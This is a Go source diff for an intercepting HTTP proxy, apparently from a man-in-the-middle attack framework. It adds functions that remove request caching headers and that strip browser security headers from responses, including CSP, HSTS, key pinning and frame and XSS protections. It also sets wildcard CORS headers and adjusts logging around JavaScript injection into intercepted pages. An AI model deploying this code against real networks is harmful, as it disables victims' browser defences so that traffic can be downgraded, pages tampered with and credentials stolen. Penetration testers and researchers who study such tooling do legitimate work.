@@ -11,8 +11,18 @@ import (
 	"github.com/elazarl/goproxy"
 )
 
+func (p *HTTPProxy) fixRequestHeaders(req *http.Request) {
+	req.Header.Del("Accept-Encoding")
+	req.Header.Del("If-None-Match")
+	req.Header.Del("If-Modified-Since")
+	req.Header.Del("Upgrade-Insecure-Requests")
+	req.Header.Set("Pragma", "no-cache")
+}
+
 func (p *HTTPProxy) onRequestFilter(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 	log.Debug("(%s) < %s %s %s%s", core.Green(p.Name), req.RemoteAddr, req.Method, req.Host, req.URL.Path)
+
+	p.fixRequestHeaders(req)
 
 	redir := p.stripper.Preprocess(req, ctx)
 	if redir != nil {
@@ -39,6 +49,25 @@ func (p *HTTPProxy) onRequestFilter(req *http.Request, ctx *goproxy.ProxyCtx) (*
 	}
 
 	return req, nil
+}
+
+func (p *HTTPProxy) fixResponseHeaders(res *http.Response) {
+	res.Header.Del("Content-Security-Policy-Report-Only")
+	res.Header.Del("Content-Security-Policy")
+	res.Header.Del("Strict-Transport-Security")
+	res.Header.Del("Public-Key-Pins")
+	res.Header.Del("Public-Key-Pins-Report-Only")
+	res.Header.Del("X-Frame-Options")
+	res.Header.Del("X-Content-Type-Options")
+	res.Header.Del("X-WebKit-CSP")
+	res.Header.Del("X-Content-Security-Policy")
+	res.Header.Del("X-Download-Options")
+	res.Header.Del("X-Permitted-Cross-Domain-Policies")
+	res.Header.Del("X-Xss-Protection")
+	res.Header.Set("Allow-Access-From-Same-Origin", "*")
+	res.Header.Set("Access-Control-Allow-Origin", "*")
+	res.Header.Set("Access-Control-Allow-Methods", "*")
+	res.Header.Set("Access-Control-Allow-Headers", "*")
 }
 
 func (p *HTTPProxy) getHeader(res *http.Response, header string) string {
@@ -69,11 +98,12 @@ func (p *HTTPProxy) doScriptInjection(res *http.Response, cType string) (error, 
 	if err != nil {
 		return err, nil
 	} else if html := string(raw); strings.Contains(html, "</head>") {
-		log.Info("(%s) > injecting javascript (%d bytes) into %s for %s",
+		log.Info("(%s) > injecting javascript (%d bytes) into %s (%d bytes) for %s",
 			core.Green(p.Name),
 			len(p.jsHook),
 			core.Yellow(res.Request.Host+res.Request.URL.Path),
-			core.Bold(res.Request.RemoteAddr))
+			len(raw),
+			core.Bold(strings.Split(res.Request.RemoteAddr, ":")[0]))
 
 		html = strings.Replace(html, "</head>", p.jsHook, -1)
 		newResp := goproxy.NewResponse(res.Request, cType, res.StatusCode, html)
@@ -96,6 +126,8 @@ func (p *HTTPProxy) onResponseFilter(res *http.Response, ctx *goproxy.ProxyCtx) 
 	}
 
 	log.Debug("(%s) > %s %s %s%s", core.Green(p.Name), res.Request.RemoteAddr, res.Request.Method, res.Request.Host, res.Request.URL.Path)
+
+	p.fixResponseHeaders(res)
 
 	p.stripper.Process(res, ctx)
 
